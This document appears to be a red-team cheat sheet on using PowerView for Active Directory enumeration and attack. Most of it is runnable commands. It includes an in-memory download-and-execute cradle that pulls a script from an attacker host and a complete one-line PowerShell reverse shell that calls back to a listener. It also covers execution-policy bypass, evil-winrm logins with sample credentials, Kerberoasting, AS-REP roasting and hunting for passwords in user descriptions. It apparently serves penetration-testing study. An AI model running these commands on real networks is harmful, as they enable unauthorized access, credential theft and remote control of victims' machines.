# 🕵️ PowerView — Active Directory Enumeration

> **Category:** Offensive Active Directory → Domain Enumeration
> **Tags:** `PowerShell` `Active Directory` `LDAP` `Kerberoasting` `Privilege Escalation`

---

## 📖 What is PowerView?

**PowerView** is a PowerShell tool used to enumerate Active Directory environments.

It allows attackers and security professionals to gather information about:

- Users
- Groups
- Computers
- Domain Controllers
- Trust relationships
- Sessions
- Permissions
- GPOs

PowerView acts as a **PowerShell replacement for many `net` commands**, but provides **far deeper access into AD internals** using:

- LDAP
- Windows API
- .NET AD classes

It leverages **PowerShell AD hooks** and underlying **Win32 API functions** to interact with Active Directory — ideal for **reconnaissance** and **privilege escalation** during red team engagements.

**References:**
- [PowerSploit Recon Docs](https://github.com/PowerShellMafia/PowerSploit)
- [PowerSploit GitHub](https://github.com/PowerShellMafia/PowerSploit)
- [Forest — HackTheBox](https://www.hackthebox.com/)

---

## 🔑 Initial Access Example

```bash
evil-winrm -i 192.168.1.101 -u jdoe -p Password123!
```

```bash
evil-winrm -i 10.10.10.161 -u svc-alfresco -p s3rvice
```

---

## 🛠️ Setup

### 1. Download PowerView

```bash
mkdir /opt/ADtools
cd /opt/ADtools/
wget https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1
```

### 2. Host the Script

```bash
python3 -m http.server 80
```

### 3. Transfer to Target Machine

```powershell
powershell (New-Object System.Net.WebClient).DownloadFile('http://192.168.1.7/PowerView.ps1', 'PowerView.ps1')
```

**Alternative (stealthier):**

```powershell
IEX (New-Object Net.WebClient).DownloadString("http://192.168.1.7/PowerView.ps1")
```

```powershell
Invoke-WebRequest http://192.168.1.7/PowerView.ps1 -OutFile PowerView.ps1
```

### 4. Execution Policy Bypass

```powershell
powershell -nop -ep bypass
```

### 5. Import PowerView

To load all the PowerView functions into the current session:

```powershell
Import-Module .\PowerView.ps1
```

Or execute the script directly without importing the functions:

```powershell
.\PowerView.ps1
```

---

## 🎧 Basic Listener (Reverse Shell Handling)

```bash
rlwrap nc -nlvp 4433
```

**Flags explained:**

| Flag | Meaning |
|---|---|
| `rlwrap` | Adds readline features (history, editing, arrow keys) |
| `nc` | Netcat network utility |
| `-n` | Disable DNS lookup (faster) |
| `-l` | Listen mode |
| `-v` | Verbose |
| `-p` | Specify port |

### Install rlwrap

**Debian / Kali:**
```bash
sudo apt install rlwrap
```

### Example Workflow

**1️⃣ Start Listener**

```bash
rlwrap nc -nlvp 4433
```
Output:
```
listening on [any] 4433 ...
```

**2️⃣ Trigger Reverse Shell from Target**

Example PowerShell reverse shell:

```powershell
$client=New-Object System.Net.Sockets.TCPClient("192.168.1.7",4433);$stream=$client.GetStream();[byte[]]$bytes=0..65535|%{0};while(($i=$stream.Read($bytes,0,$bytes.Length)) -ne 0){$data=(New-Object System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback=(iex $data 2>&1|Out-String);$sendback2=$sendback+"PS "+(pwd).Path+"> ";$sendbyte=([Text.Encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}
```

**3️⃣ Connection Received**

```
connect to [192.168.1.7] from (UNKNOWN) [10.10.10.5] 49821
PS C:\Users\jdoe>
```

You now have an **interactive shell**.

---

## 🌐 Active Directory Enumeration

### Domain Enumeration

**Get domain information:**
```powershell
Get-Domain
Get-NetDomain
```

**Get domain SID:**
```powershell
Get-DomainSID
```

**Get domain controllers:**
```powershell
Get-DomainController
Get-NetDomainController
```

**Specific domain:**
```powershell
Get-Domain -Domain infosecwarrior.local
```

---

### 👤 User Enumeration

| Purpose | Command |
|---|---|
| List all domain users | `Get-DomainUser` |
| Show usernames | `Get-DomainUser \| select samaccountname` |
| User logon statistics | `Get-DomainUser \| select samaccountname,logoncount` |
| Get specific user | `Get-DomainUser -Identity ankit` |
| All properties | `Get-DomainUser -Identity ankit -Properties *` |
| Search description field (common for passwords) | `Get-DomainUser -LDAPFilter "Description=*pass*" \| select name,description` |
| Search service accounts | `Get-DomainUser -SPN` |
| Find users with Kerberos SPNs | `Get-DomainUser -SPN \| select samaccountname,serviceprincipalname` |

> ⚠️ **Note:** `Get-DomainUser` can throw a `MethodInvocationException` (`"The specified directory service attribute or value does not exist"`) if run outside a domain context or with an invalid LDAP filter — make sure you're authenticated in a domain session before running these.

---

### 👥 Group Enumeration

```powershell
# List domain groups
Get-DomainGroup

# Groups with adminCount=1
Get-DomainGroup -AdminCount

# Members of Domain Admins
Get-DomainGroupMember "Domain Admins"

# Recursive membership
Get-DomainGroupMember -Identity "Domain Admins" -Recurse

# Find user group membership
Get-DomainGroup -UserName ankit
```

---

### 💻 Computer Enumeration

```powershell
# List domain computers
Get-DomainComputer

# Show hostnames
Get-DomainComputer | select dnshostname

# Ping discovered machines
Get-DomainComputer -Ping

# Operating system enumeration
Get-DomainComputer | select name,operatingsystem

# Find servers
Get-DomainComputer -OperatingSystem "*Server*"
```

---

### 📜 GPO Enumeration

```powershell
# List GPOs
Get-DomainGPO

# Domain policies
Get-DomainPolicy

# Default Domain Policy
Get-DomainPolicyData -Policy DefaultDomainPolicy

# Domain Controller Policy
Get-DomainPolicyData -Policy DomainControllerPolicy
```

---

### 🔐 Session Enumeration

```powershell
# Find where users are logged in
Get-NetLoggedOn

# Check RDP sessions
Get-NetRDPSession

# Last logged-on user
Get-LastLoggedOn

# Find logged-on users locally
Get-LoggedonLocal
```

---

## 📈 Privilege Escalation Recon

```powershell
# Find machines where you are local admin
Find-LocalAdminAccess

# Enumerate local admins
Invoke-EnumerateLocalAdmin
```

---

## 📁 File and Share Discovery

```powershell
# Find network shares
Invoke-ShareFinder

# Find sensitive files
Invoke-FileFinder

# List file servers
Get-NetFileServer
```

---

## ⚔️ Attack Techniques

### Kerberoasting

```powershell
# Extract service tickets for cracking
Invoke-Kerberoast

# Export hash
Invoke-Kerberoast -OutputFormat Hashcat
```

### AS-REP Roasting

```powershell
# Find users without Kerberos pre-authentication
Get-DomainUser -PreauthNotRequired
```

### ACL Abuse (Very Important)

```powershell
# Find interesting ACL permissions
Find-InterestingDomainAcl
```

---

## 🎯 Useful Filters

```powershell
# Find disabled accounts
Get-DomainUser -UACFilter ACCOUNTDISABLE

# Find password never expires
Get-DomainUser -UACFilter DONT_EXPIRE_PASSWORD

# Find users with adminCount=1
Get-DomainUser -AdminCount
```

### Fileless / In-Memory Execution

```powershell
IEX (New-Object Net.WebClient).DownloadString("http://attacker/PowerView.ps1")
```

---

## 🌟 Why PowerView is Important

PowerView helps identify:

- Privilege escalation paths
- Misconfigured permissions
- Domain trust relationships
- Kerberoastable accounts
- Lateral movement opportunities

It is one of the **core tools used in AD attacks**, alongside:

- **BloodHound**
- **Mimikatz**
- **Rubeus**

---

## 📚 References

- [PowerSploit — GitHub](https://github.com/PowerShellMafia/PowerSploit)
- [Rubeus — GitHub](https://github.com/GhostPack/Rubeus)
- [BloodHound — GitHub](https://github.com/BloodHoundAD/BloodHound)
